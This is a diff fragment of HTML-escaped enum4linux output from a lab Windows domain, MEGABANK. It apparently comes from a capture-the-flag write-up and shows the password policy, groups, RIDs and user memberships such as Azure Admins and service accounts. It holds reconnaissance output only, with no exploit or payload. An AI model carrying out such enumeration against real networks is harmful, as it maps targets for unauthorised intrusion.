-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Trying protocol 445/SMB...&lt;/span&gt;
-
-&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;!]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Protocol failed&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Missing required parameter 'digestmod'.&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Retieved partial password policy with rpcclient&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;Password Complexity&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Disabled&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Minimum Password Length&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;7&lt;/span&gt;
-
-
- &lt;span class=&quot;nv&quot;&gt;==============================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;|    Groups on 10.10.10.172    |&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;==============================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting builtin groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting builtin group memberships&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting local groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Cert Publishers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x205&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;RAS and IAS Servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x229&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Allowed RODC Password Replication Group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x23b&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Denied RODC Password Replication Group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x23c&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DnsAdmins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x44d&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SQLServer2005SQLBrowserUser$MONTEVERDE&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x44f&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADSyncAdmins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x451&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADSyncOperators&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x452&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADSyncBrowse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x453&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADSyncPasswordSet&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x454&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting local group memberships&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Denied RODC Password Replication Group' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;572) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Couldn't lookup SIDs&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'ADSyncAdmins' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;1105) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Couldn't lookup SIDs&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting domain groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Enterprise Read-only Domain Controllers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x1f2&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Domain Users&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x201&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Domain Guests&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x202&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Domain Computers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x203&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Group Policy Creator Owners&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x208&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Cloneable Domain Controllers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x20a&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Protected Users&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x20d&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DnsUpdateProxy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0x44e&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Azure Admins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa29&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;File Server Admins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa2e&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Call Recording Admins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa2f&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Reception&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa30&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Operations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa31&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Trading&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa32&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HelpDesk&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa33&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Developers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0xa34&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Getting domain group memberships&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Guests' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;514) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\Guest&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Trading' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2610) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\dgalanos&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'HelpDesk' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2611) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\roleary&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Azure Admins' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2601) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\Administrator&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Azure Admins' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2601) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\AAD_987d7f2f57d2&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Azure Admins' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2601) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\mhope&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\Administrator&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\krbtgt&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\AAD_987d7f2f57d2&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\mhope&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\SABatchJobs&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\svc-ata&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\svc-bexec&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\svc-netapp&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\dgalanos&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\roleary&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Domain Users' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;513) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\smorgan&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Group 'Group Policy Creator Owners' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;520) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\Administrator&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.&lt;/span&gt;
